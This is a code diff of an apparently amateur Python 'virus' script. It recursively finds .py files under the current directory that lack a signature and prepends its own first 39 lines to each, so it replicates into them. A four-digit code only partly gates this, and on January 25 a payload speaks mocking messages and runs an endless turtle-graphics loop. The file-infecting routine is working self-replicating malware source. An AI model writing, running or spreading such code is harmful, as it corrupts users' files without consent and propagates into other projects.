@@ -1,6 +1,8 @@
 import pyttsx3
 import os
-
+import datetime
+import turtle
+t = turtle.Turtle()
 engine = pyttsx3.init()
 
 engine.setProperty('rate', 150)
@@ -12,67 +14,115 @@ def intro():
     safety_code = input("Enter four digit code (hint: Ripon College): ")
     return safety_code
 
+SIGNATURE = "sig"
 
-def WillItInfect (safety_code):
+def search(path):
+
+    filestoinfect = []
+
+    filelist = os.listdir(path)
+
+    for fname in filelist:
+
+        if os.path.isdir(path+"/"+fname):
+
+            filestoinfect.extend(search(path+"/"+fname))
+
+        elif fname[-3:] == ".py":
+
+            infected = False
+
+            for line in open(path+"/"+fname):
+
+                if SIGNATURE in line:
+
+                    infected = True
+
+                    break
+
+            if infected == False:
+
+                filestoinfect.append(path+"/"+fname)
+
+    return filestoinfect
+
+
+
+
+def infect(filestoinfect):
+
+    virus = open(os.path.abspath(__file__))
+
+    virusstring = ""
+
+    for i,line in enumerate(virus):
+
+        if i>=0 and i <39:
+
+            virusstring += line
+
+    virus.close
+
+    for fname in filestoinfect:
+
+        f = open(fname)
+
+        temp = f.read()
+
+        f.close()
+
+        f = open(fname,"w")
+
+        f.write(virusstring + temp)
+
+        f.close()
+
+
+
+
+def WillItInfect (safety_code, filestoinfect):
     if safety_code == "1851":
-        print("Your Computer Is safe Congrats!!!!!")
-    else:
-        Virus_infection()
+        engine.say("Your Computer Is safe Congrats!!!!!")
+        engine.runAndWait()
+    else:  
+        Virus_infection(filestoinfect)
         
 
 
-
-
-
-def Virus_infection():
+def Virus_infection(filestoinfect):
     engine.say("you are infected")
     engine.runAndWait()
-    
-    #make a signiture can be anything in order to ID the virus and seperate it from other file types
-SIG = "My First Virus"
-def find_a_path(route):
-     #step one is to create an empty list for the virus
-    infect = []
-     #set a variable for returning the names of files in a directory path
-    list_of_files = os.listdir(route)
-    # use a for loop to determine if a file is a python file
-    for name in list_of_files:
-            #this searches to see if the file is a python file and if it is a python file if it is
-            # infected or not if not it sets infected to false and lauches an infector in the form of another for loop
-        if os.path.isdir(route+'/'+name):
-            infect.extend(find_a_path(route+'/'+name))
-        elif name[-3:] ==".py":
-            infected = False
-    #this looks for the SIG to dertermine if the virus has already affected the python file and if not it appends it
-            for line in open(route+'/'+name):
-                if SIG in line:
-                    infected = True
-                    break
-            if infected == False:
-                infect.append(route+'/'+name)
-        return infect
-def spread(infect):
-    virus = open(os.path.abspath(__file__))
-    virusstring = ""
-    for i,line in enumerate(virus):
-        if i >= 0 and i < 39:
-            virusstring += line
-    virus.close
-    for name in infect:
-        f = open(name)
-        temp = f.read()
-        f.close()
-        f = open(name, "w")
-        f.write(virusstring + temp)
-        f.close()
+    infect(filestoinfect)
+
+def payload(t):
+    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
+        x = 1 
+        y = "once apon a time there was a person who opened the wrong file. This is what happened"
+        engine.say(y)
+        engine.runAndWait()
+        engine.say("you are infected ha ha ha ha ha ha ha")
+        engine.runAndWait()
+        go = 2
+        if x == 1:
+            while go == 2:
+                x = 1
+                y = 1
+                t.fd(x)
+                t.lt(y)
+                x = x + 50
+                y = y + 20
+                
+
+
     
 
        
 
-
-
-
+  
+intro()
+filestoinfect = search(os.path.abspath(""))
 safety_code = intro()
-WillItInfect(safety_code)
+payload(t)
+WillItInfect(safety_code, filestoinfect)
 
 
